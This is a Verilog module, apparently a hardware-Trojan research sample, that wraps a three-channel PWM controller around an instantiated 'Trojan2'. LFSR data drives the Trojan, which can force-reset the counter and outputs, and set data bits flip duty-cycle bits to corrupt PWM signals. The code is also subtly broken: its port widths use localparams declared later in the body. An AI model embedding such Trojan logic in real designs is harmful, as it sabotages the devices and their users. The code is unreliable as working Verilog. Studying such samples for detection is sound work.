// PWM Host Circuit for Trojan2
// Fixed I/O to match Trojan2: clk, rst, data_in[7:0] -> force_reset
module trojan2_pwm_host #(
    parameter [25:0] PWM_PATTERN = 26'h123ABCD  // Pattern for data generation
)(
    input wire clk,
    input wire rst,
    input wire [PWM_WIDTH*PWM_CHANNELS-1:0] duty_cycles,  // Packed duty cycles
    input wire [PWM_WIDTH-1:0] period_value,
    input wire pwm_enable,
    output reg [PWM_CHANNELS-1:0] pwm_outputs,  // Packed PWM outputs
    output reg period_complete
);

    // Sizing parameters (converted from parameter to localparam)
    localparam PWM_WIDTH = 12;     // PWM counter resolution
    localparam PWM_CHANNELS = 3;   // Number of PWM channels (1-8 max supported)

    // Trojan interface (fixed width)
    reg [7:0] trojan_data_in;
    wire trojan_force_reset;
    
    // PWM control signals
    reg [PWM_WIDTH-1:0] pwm_counter;
    reg [25:0] pattern_lfsr;
    reg [2:0] pwm_state;
    reg [2:0] channel_sel;  // Support up to 8 channels
    reg period_flag;
    
    // Internal duty cycle array for easier access
    reg [PWM_WIDTH-1:0] duty_cycle_array [0:PWM_CHANNELS-1];
    
    // Loop variables
    integer i, j;
    
    // Extract duty cycles from packed input
    always @(*) begin
        for (i = 0; i < PWM_CHANNELS; i = i + 1) begin
            duty_cycle_array[i] = duty_cycles[(i+1)*PWM_WIDTH-1 -: PWM_WIDTH];
        end
    end
    
    // Data generation for trojan
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            pattern_lfsr <= PWM_PATTERN;
            channel_sel <= 3'b000;
        end else if (pwm_enable) begin
            pattern_lfsr <= {pattern_lfsr[24:0], pattern_lfsr[25] ^ pattern_lfsr[21] ^ pattern_lfsr[15] ^ pattern_lfsr[4]};
            if (period_flag) begin
                if (channel_sel >= PWM_CHANNELS - 1)
                    channel_sel <= 3'b000;
                else
                    channel_sel <= channel_sel + 1;
            end
        end
    end
    
    // Select data based on current channel (parameterized)
    always @(*) begin
        case (channel_sel & 3'b011)  // Cycle through 4 patterns using bit-AND
            3'b000: trojan_data_in = pattern_lfsr[7:0];
            3'b001: trojan_data_in = pattern_lfsr[15:8];
            3'b010: trojan_data_in = pattern_lfsr[23:16];
            3'b011: trojan_data_in = pattern_lfsr[25:18];
            default: trojan_data_in = 8'h00;
        endcase
    end
    
    // PWM counter and state machine
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            pwm_counter <= {PWM_WIDTH{1'b0}};
            pwm_state <= 3'b000;
            period_complete <= 1'b0;
            period_flag <= 1'b0;
        end else if (trojan_force_reset) begin
            // Synchronous reset from trojan
            pwm_counter <= {PWM_WIDTH{1'b0}};
            pwm_state <= 3'b000;
            period_complete <= 1'b0;
            period_flag <= 1'b0;
        end else if (pwm_enable) begin
            case (pwm_state)
                3'b000: begin // IDLE
                    pwm_counter <= {PWM_WIDTH{1'b0}};
                    period_complete <= 1'b0;
                    period_flag <= 1'b0;
                    if (pwm_enable) begin
                        pwm_state <= 3'b001;
                    end
                end
                3'b001: begin // COUNT
                    period_complete <= 1'b0;
                    period_flag <= 1'b0;
                    if (pwm_counter >= period_value) begin
                        pwm_counter <= {PWM_WIDTH{1'b0}};
                        period_complete <= 1'b1;
                        period_flag <= 1'b1;
                        pwm_state <= 3'b010;
                    end else begin
                        pwm_counter <= pwm_counter + 1;
                    end
                end
                3'b010: begin // PERIOD_COMPLETE
                    period_complete <= 1'b0;
                    pwm_state <= 3'b001;
                end
                default: pwm_state <= 3'b000;
            endcase
        end else begin
            pwm_state <= 3'b000;
            period_complete <= 1'b0;
            period_flag <= 1'b0;
        end
    end
    
    // PWM output generation with trojan influence
    // Note: If PWM_CHANNELS > 8, trojan bits will be reused cyclically
    reg [PWM_WIDTH-1:0] trojan_modified_duty;
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            for (j = 0; j < PWM_CHANNELS; j = j + 1) begin
                pwm_outputs[j] <= 1'b0;
            end
        end else if (trojan_force_reset) begin
            // Synchronous reset from trojan
            for (j = 0; j < PWM_CHANNELS; j = j + 1) begin
                pwm_outputs[j] <= 1'b0;
            end
        end else if (pwm_enable) begin
            // Generate PWM outputs for all channels
            for (j = 0; j < PWM_CHANNELS; j = j + 1) begin
                if (trojan_data_in[j]) begin
                    // Trojan influence: XOR with single-bit mask at position (j & 3)
                    // Standard Verilog synthesis-friendly approach
                    trojan_modified_duty = duty_cycle_array[j] ^ ({{(PWM_WIDTH-1){1'b0}}, 1'b1} << j[1:0]);
                    pwm_outputs[j] <= (pwm_counter < trojan_modified_duty);
                end else begin
                    // Normal PWM operation
                    pwm_outputs[j] <= (pwm_counter < duty_cycle_array[j]);
                end
            end
        end else begin
            for (j = 0; j < PWM_CHANNELS; j = j + 1) begin
                pwm_outputs[j] <= 1'b0;
            end
        end
    end
    
    // Instantiate Trojan2
    Trojan2 trojan_inst (
        .clk(clk),
        .rst(rst),
        .data_in(trojan_data_in),
        .force_reset(trojan_force_reset)
    );

endmodule

